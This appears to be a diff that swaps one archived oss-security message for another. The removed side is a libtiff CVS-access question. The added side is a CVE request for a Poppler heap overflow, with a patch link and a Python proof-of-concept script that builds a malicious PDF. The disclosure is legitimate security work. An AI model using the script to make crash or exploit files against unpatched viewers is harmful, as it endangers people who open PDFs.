@@ -1,31 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/10/2
-Message-ID: <20161110015757.20558.28D1CED1@matica.foolinux.mooo.com>
-Date: Wed, 9 Nov 2016 18:01:51 -0800
-From: Ian Zimmerman <itz@...mate.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/12/1
+Message-ID: <CAEDLTO9PTJy54Wqbb3c63phUbv5xCKJHkueNfFKtb0hy6VxpVQ@mail.gmail.com>
+Date: Mon, 11 Apr 2016 20:52:27 -0300
+From: Felipe <felipe.andres.manzano@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE Request: libtiff: heap buffer overflow/read outside of array
+Subject: CVE request: Poppler < 0.40.0
 Content-Type: text/plain; charset=utf-8
 
-On 2016-11-09 17:32, Brian 'geeknik' Carpenter wrote:
+This is a clean heap overflow. Lib is used in evince and okular and for
+preview in nautilus. Versions pre 0.40.0 are vulnerable.
 
-> http://bugzilla.maptools.org/show_bug.cgi?id=2587
-> Fixed per
-> >> 2016-11-10 Even Rouault <even.rouault at spatialys.com>
+The patch:
+https://cgit.freedesktop.org/poppler/poppler/commit/?id=b3425dd3261679958cd56c0f71995c15d2124433
 
-I tried to check out the sources to patch this for myself, following the
-recipe from the webpage:
 
- [2+0]Downloads$ export CVSROOT=:pserver:anonymous@...otesensing.org:/cvsroot
- [3+0]Downloads$ cvs login
-Logging in to :pserver:anonymous@...otesensing.org:2401/cvsroot
-CVS password: # use password "anonymous" 
-cvs [login aborted]: connect to remotesensing.org(23.236.62.147):
-2401 failed: Connection timed out
+A crashy pdf file is attached.
 
-Is there another/better way?
+PoC.py
+from miniPDF.miniPDF import *
+#from miniPDF.miniPDFO import *
+import zlib
+#The document
+doc = PDFDoc()
 
--- 
-Please *no* private Cc: on mailing lists and newsgroups
-Personal signed mail: please _encrypt_ and sign
-Don't clear-text sign: http://cr.yp.to/smtp/8bitmime.html
+#font
+font = PDFDict()
+font.add("Name", PDFName("F1"))
+font.add("Subtype", PDFName("Type1"))
+font.add("BaseFont", PDFName("Helvetica"))
+
+#name:font map
+fontname = PDFDict()
+fontname.add("F1",font)
+
+#resources
+resources = PDFDict()
+resources.add("Font",fontname)
+
+
+data = '''BT /F1 24 Tf 240 700 Td (Pedefe Pedefeito
+endstream
+endobj
+obj 1 0
+99
+endobj
+Pedefeon!) Tj
+ET /GS3 gs'''
+#contents
+contentsDict = PDFDict()
+contents= PDFStream({},data)
+
+
+length = PDFNum(len(data))
+doc.add(length)
+contents.add('Length',PDFRef(length))
+#page
+page = PDFDict()
+page.add("Type",PDFName("Page"))
+page.add("Resources",resources)
+page.add("Contents", PDFRef(contents))
+
+#pages
+pages = PDFDict()
+pages.add("Type", PDFName("Pages"))
+pages.add("Kids", PDFArray([PDFRef(page)]))
+pages.add("Count", PDFNum(1))
+
+#add parent reference in page
+page.add("Parent",PDFRef(pages))
+
+
+#catalog
+catalog = PDFDict()
+catalog.add("Type", PDFName("Catalog"))
+catalog.add("Pages", PDFRef(pages))
+
+doc.add([catalog,pages,page,contents])
+doc.setRoot(catalog)
+
+
+#The Function thing
+function = PDFDict()
+function.add("FunctionType",PDFNum(2))
+function.add("Domain",PDFArray([0,1]))
+function.add("N",PDFNum(100))
+#2261634.5098039214
+size = 10000000
+function.add("C0",PDFArray([2261634.5098039214]*size))
+function.add("C1",PDFArray([2261634.5098039214]*size))
+
+
+extgstate = PDFDict()
+extgstate.add("Type",PDFName("ExtGState"))
+extgstate.add("TR",function)
+
+resources.add("ExtGState","<< /GS3 "+str(extgstate)+">>")
+
+print doc
+
+Content of type "text/html" skipped
+
+Download attachment "crash.pdf.gz" of type "application/x-gzip" (2436 bytes)
